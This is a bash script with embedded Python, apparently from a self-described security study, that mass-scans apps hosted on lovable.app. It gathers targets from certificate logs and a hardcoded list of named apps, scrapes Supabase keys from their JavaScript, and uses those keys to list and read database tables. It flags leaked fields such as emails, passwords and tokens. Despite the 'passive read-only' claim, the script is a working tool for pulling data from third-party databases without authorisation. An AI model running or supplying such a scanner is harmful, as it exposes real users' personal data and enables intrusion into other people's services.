#!/bin/bash
# ============================================================================
# SSAP Quick-Find: 10 Insecure Vibe-Coded Apps in 5 Minutes
# ============================================================================
#
# Based on published research showing:
#   - 11% of vibe-coded apps expose Supabase credentials (SupaExplorer, Jan 2026)
#   - 20% have exploitable vulnerabilities (Wiz Research, Sep 2025)
#   - 170+ apps vulnerable from just examining Lovable Launched (CVE-2025-48757)
#   - 83% of exposed Supabase DBs have RLS misconfigs (Pablo Stanley, Jan 2026)
#
# This script:
#   Phase 1: Discovers lovable.app subdomains from Certificate Transparency logs
#   Phase 2: Fetches each app's homepage + JS bundles, extracts Supabase URLs + anon keys
#   Phase 3: For each Supabase project found, probes /rest/v1/ for table exposure
#
# ALL operations are passive read-only GETs (same as a web browser visiting the site).
#
# Prerequisites: curl, jq, python3  (all pre-installed on macOS)
#
# Usage:
#   chmod +x find_10_insecure.sh
#   ./find_10_insecure.sh
# ============================================================================

set -uo pipefail

RESULTS_DIR="$HOME/Projects/SSAP-Security-Study/scan_results"
mkdir -p "$RESULTS_DIR"
TS=$(date +%Y%m%d_%H%M%S)
LOG="$RESULTS_DIR/scan_log_$TS.txt"
JSON_OUT="$RESULTS_DIR/findings_$TS.json"
INSECURE_OUT="$RESULTS_DIR/insecure_apps_$TS.json"

echo "================================================================" | tee "$LOG"
echo "  SSAP Quick-Find: Insecure Vibe-Coded Apps"                     | tee -a "$LOG"
echo "  $(date)"                                                        | tee -a "$LOG"
echo "================================================================" | tee -a "$LOG"
echo ""

# ── Phase 1: Discovery ──────────────────────────────────────────────────────

echo "[Phase 1] Discovering lovable.app subdomains from CT logs..." | tee -a "$LOG"
echo "  Querying crt.sh (takes 10-30 seconds)..." | tee -a "$LOG"

# Pull all SSL certificates ever issued for *.lovable.app
CT_RAW=$(curl -s "https://crt.sh/?q=%.lovable.app&output=json" 2>/dev/null)

# Extract unique subdomains
DOMAINS=$(echo "$CT_RAW" | python3 -c "
import json, sys
try:
    data = json.load(sys.stdin)
    seen = set()
    for e in data:
        cn = e.get('common_name', '')
        # Skip wildcards, skip the base domain
        if cn and '*' not in cn and cn.endswith('.lovable.app') and cn != 'lovable.app':
            if cn not in seen:
                seen.add(cn)
                print(cn)
except Exception as ex:
    print(f'ERROR: {ex}', file=sys.stderr)
" 2>/dev/null | sort -u | head -200)

CT_COUNT=$(echo "$DOMAINS" | grep -c lovable || echo 0)
echo "  Found $CT_COUNT unique lovable.app subdomains" | tee -a "$LOG"

if [ "$CT_COUNT" -lt 10 ]; then
    echo "  Adding known apps from directories..." | tee -a "$LOG"
    DOMAINS=$(echo "$DOMAINS"; cat << 'EOF'
preview--ai-supabase-sentinel.lovable.app
supabadge.lovable.app
lovable-superbase-buddy.lovable.app
cosmic-supabase-dreamscape.lovable.app
supabase-perk-seeker.lovable.app
zerotoproduct.lovable.app
pfm-benchmark.lovable.app
preview--breezy-next-supabase.lovable.app
preview--supabase-partner-buddy.lovable.app
build-launch-win.lovable.app
escher.lovable.app
clinicalai.lovable.app
enterpriseform.lovable.app
shipped.lovable.app
february.lovable.app
makelovable.lovable.app
productlaunch.lovable.app
lovablevibe.lovable.app
noel-2025.lovable.app
wong-tang-clan.lovable.app
EOF
    )
    DOMAINS=$(echo "$DOMAINS" | sort -u)
fi

TOTAL=$(echo "$DOMAINS" | wc -l | tr -d ' ')
echo "  Total targets: $TOTAL" | tee -a "$LOG"

# ── Phase 2 + 3: Scan for Supabase + RLS ────────────────────────────────────

echo "" | tee -a "$LOG"
echo "[Phase 2+3] Scanning for Supabase keys and testing RLS..." | tee -a "$LOG"
echo "  (Scanning first 100 targets, ~2 min)" | tee -a "$LOG"

# Use Python for the actual scanning since we need async + regex
echo "$DOMAINS" | head -100 > /tmp/ssap_targets.txt

python3 << 'PYSCANNER'
import asyncio, httpx, re, json, sys
from datetime import datetime

# Load targets
with open('/tmp/ssap_targets.txt') as f:
    targets = [line.strip() for line in f if line.strip()]

# Patterns
SB_URL = re.compile(r'https://([a-z0-9]{10,30})\.supabase\.co')
JWT = re.compile(r'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}')
SVCRL = re.compile(r'service.?role', re.I)
JS = re.compile(r'(?:src|href)=["\']?(/assets/[^"\'>\s]+\.js)', re.I)
HDRS = ['strict-transport-security','content-security-policy','x-content-type-options',
        'x-frame-options','referrer-policy','permissions-policy']

results = []
insecure = []
count = 0

async def scan(client, domain):
    global count
    url = f"https://{domain}"
    r = {'url': url, 'domain': domain, 'status': None, 'supabase_project': None,
         'anon_key_found': False, 'service_role_found': False,
         'tables_listed': [], 'tables_exposed': [], 'sensitive_data': [],
         'missing_headers': [], 'findings': [], 'grade': None, 'error': None}
    try:
        resp = await client.get(url, follow_redirects=True, timeout=15)
        r['status'] = resp.status_code
        if resp.status_code != 200:
            r['error'] = f"HTTP {resp.status_code}"
            return r

        html = resp.text
        hdrs = {k.lower(): v for k, v in resp.headers.items()}

        # Missing headers
        for h in HDRS:
            if h not in hdrs:
                r['missing_headers'].append(h)

        # Fetch JS bundles
        all_text = html
        base = url.rstrip('/')
        for path in JS.findall(html)[:5]:
            try:
                br = await client.get(base + path, timeout=10)
                if br.status_code == 200: all_text += br.text
            except: pass

        # Find Supabase
        sb = SB_URL.search(all_text)
        if not sb: return r

        proj = sb.group(1)
        r['supabase_project'] = proj
        sb_url = f"https://{proj}.supabase.co"

        jwts = JWT.findall(all_text)
        if not jwts: return r
        r['anon_key_found'] = True
        key = jwts[0]

        # Check for service_role
        for j in jwts:
            idx = all_text.find(j)
            ctx = all_text[max(0,idx-300):idx+100]
            if SVCRL.search(ctx):
                r['service_role_found'] = True
                r['findings'].append('🔴 CRITICAL: service_role key in client JS')

        # Probe REST API
        try:
            api = await client.get(f"{sb_url}/rest/v1/",
                headers={'apikey': key, 'Authorization': f'Bearer {key}'},
                timeout=10)
            if api.status_code == 200:
                schema = api.json()
                if isinstance(schema, dict):
                    paths = schema.get('paths', {})
                    tables = [p.strip('/') for p in paths if p not in ['/', '']]
                    if not tables and 'definitions' in schema:
                        tables = list(schema['definitions'].keys())
                    r['tables_listed'] = tables

                    # Probe each table
                    for tbl in tables[:15]:
                        try:
                            tr = await client.get(f"{sb_url}/rest/v1/{tbl}?limit=1&select=*",
                                headers={'apikey': key, 'Authorization': f'Bearer {key}'},
                                timeout=8)
                            if tr.status_code == 200:
                                data = tr.json()
                                if isinstance(data, list) and len(data) > 0:
                                    cols = list(data[0].keys())
                                    sens = [c for c in cols if any(s in c.lower()
                                        for s in ['email','phone','password','token','secret',
                                                   'address','name','ip','auth','ssn','credit'])]
                                    r['tables_exposed'].append({'table': tbl, 'columns': cols, 'sensitive': sens})
                                    if sens:
                                        r['findings'].append(f'🔴 CRITICAL: "{tbl}" leaks sensitive data: {", ".join(sens)}')
                                        r['sensitive_data'].extend(sens)
                                    else:
                                        r['findings'].append(f'🟠 HIGH: "{tbl}" returns data (RLS missing)')
                        except: pass
        except: pass

    except Exception as e:
        r['error'] = str(e)[:80]
    return r

async def main():
    global count
    async with httpx.AsyncClient(follow_redirects=True,
            headers={'User-Agent': 'SSAP-SecurityResearch/1.0'}) as client:
        sem = asyncio.Semaphore(15)
        async def bounded(d):
            async with sem: return await scan(client, d)

        tasks = [bounded(d) for d in targets]
        for coro in asyncio.as_completed(tasks):
            r = await coro
            results.append(r)
            count += 1

            # Determine if insecure
            is_insecure = (len(r.get('tables_exposed', [])) > 0 or
                          r.get('service_role_found', False))
            if is_insecure:
                insecure.append(r)

            # Status output
            proj = r.get('supabase_project', '-')
            exposed = len(r.get('tables_exposed', []))
            marker = f" ⚠️  {exposed} TABLE(S) EXPOSED" if exposed > 0 else ""
            svc = " 🔴 SERVICE_ROLE!" if r.get('service_role_found') else ""
            sb = f"  SB:{proj}" if proj else ""
            miss_h = len(r.get('missing_headers', []))

            status_char = '✅' if r.get('status') == 200 else '❌'
            print(f"  [{count}/{len(targets)}] {status_char} {r['domain'][:45]:<45}{sb}{marker}{svc}")

    # ── Summary ──
    scanned = [x for x in results if x.get('status') == 200]
    with_sb = [x for x in scanned if x.get('supabase_project')]
    with_key = [x for x in scanned if x.get('anon_key_found')]
    with_exposed = [x for x in scanned if x.get('tables_exposed')]
    with_svc = [x for x in scanned if x.get('service_role_found')]

    print(f"\n{'='*65}")
    print(f"  RESULTS SUMMARY")
    print(f"{'='*65}")
    print(f"  Scanned successfully:    {len(scanned)}/{len(results)}")
    print(f"  Using Supabase:          {len(with_sb)} ({len(with_sb)/max(1,len(scanned))*100:.0f}%)")
    print(f"  Anon key in client JS:   {len(with_key)}")
    print(f"  TABLES EXPOSED (no RLS): {len(with_exposed)}")
    print(f"  service_role EXPOSED:    {len(with_svc)}")
    print(f"  TOTAL INSECURE:          {len(insecure)}")

    # Missing headers stats
    h_counts = {}
    for x in scanned:
        for h in x.get('missing_headers', []):
            h_counts[h] = h_counts.get(h, 0) + 1
    if h_counts:
        print(f"\n  Missing Security Headers:")
        for h, c in sorted(h_counts.items(), key=lambda x: -x[1]):
            print(f"    {h}: {c}/{len(scanned)} ({c/max(1,len(scanned))*100:.0f}%)")

    # Insecure apps detail
    if insecure:
        print(f"\n  ⚠️  INSECURE APPS FOUND:")
        for app in insecure[:15]:
            print(f"\n  {app['url']}")
            print(f"    Supabase: {app.get('supabase_project')}")
            for f in app.get('findings', []):
                print(f"    {f}")
            for t in app.get('tables_exposed', []):
                print(f"    📋 {t['table']}: {', '.join(t['columns'][:6])}...")
                if t.get('sensitive'):
                    print(f"       🚨 SENSITIVE FIELDS: {', '.join(t['sensitive'])}")

    # Save JSON
    import os
    results_dir = os.path.expanduser("~/Projects/SSAP-Security-Study/scan_results")
    os.makedirs(results_dir, exist_ok=True)
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

    with open(os.path.join(results_dir, f'all_results_{ts}.json'), 'w') as f:
        json.dump({'scan_date': datetime.utcnow().isoformat(), 'total_scanned': len(scanned),
                   'total_insecure': len(insecure), 'results': results}, f, indent=2, default=str)

    with open(os.path.join(results_dir, f'insecure_apps_{ts}.json'), 'w') as f:
        json.dump(insecure, f, indent=2, default=str)

    print(f"\n  Results saved to: {results_dir}/")
    print(f"  - all_results_{ts}.json ({len(results)} apps)")
    print(f"  - insecure_apps_{ts}.json ({len(insecure)} insecure)")

asyncio.run(main())
PYSCANNER

echo ""
echo "================================================================"
echo "  DONE. Check $RESULTS_DIR/ for full JSON results."
echo "================================================================"
